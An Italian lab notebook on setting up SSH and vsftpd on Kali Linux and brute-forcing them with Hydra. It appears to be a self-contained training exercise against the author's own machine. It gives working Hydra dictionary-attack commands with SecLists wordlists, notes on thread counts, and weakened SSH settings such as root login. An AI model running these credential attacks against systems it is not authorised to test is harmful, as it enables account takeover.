## Fase 1: Configurazione e cracking SSH su Kali Linux

1. Creazione utente di test
    
    sudo adduser test_user
    Durante la creazione:

    Password: testpass
    Puoi lasciare vuoti gli altri campi (Full Name, Room Number, ecc.) premendo Invio.

2. Avvio del servizio SSH

    sudo service ssh start

    oppure

    sudo systemctl start ssh

    Verifica che sia attivo:

    sudo service ssh status

3. (Opzionale) Modifica configurazione SSH
    Se vuoi abilitare root login o cambiare porta (non obbligatorio per l’esercizio base):
    
    sudo nano /etc/ssh/sshd_config
    Esempi di modifiche utili:

    PermitRootLogin yes
    Port 2222 (cambia porta)
    PasswordAuthentication yes

    Dopo modifiche:
    sudo systemctl restart ssh

4. Test connessione SSH
    Da un’altra macchina (o dallo stesso Kali in un altro terminale):
    
    ssh test_user@IP_DEL_TUO_KALI

    Inserisci la password testpass quando richiesto.

5. Cracking con Hydra
    Installazione di Hydra e wordlist (se non presenti):

    sudo apt update
    sudo apt install hydra seclists -y

    Comando base Hydra (con username e password noti):

    hydra -l test_user -p testpass IP_KALI ssh -t 4

    modificato file sshd_config per provare ad alzare le performance

    Attacco a dizionario (più realistico):

    hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/1k-most-used-passwords-NCSC.txt -t 3 192.168.1.10 ssh

    con -t 6 crasha il servizio

    con file troppo grossi crasha tutto anche con il -t 4 e con i tempi piu bassi ci mette molto tempo anche con 100 password a -t 3 ci mette circa 1 ora

## Fase 2: Altri servizi (es. FTP consigliato)
    Configurazione FTP (vsftpd)

    sudo apt install vsftpd -y
    
    sudo service vsftpd start

    ho verificato che con i lcomadno status fosse tutto a posto 

    Cracking FTP con Hydra:

    visto che ftp è una com unicazione piu leggera ho alzato il -t 6 e provato sul file da 1k e dice circa 15 minuti
    ovviamente nel file ho messo a mano la password in una posizione 


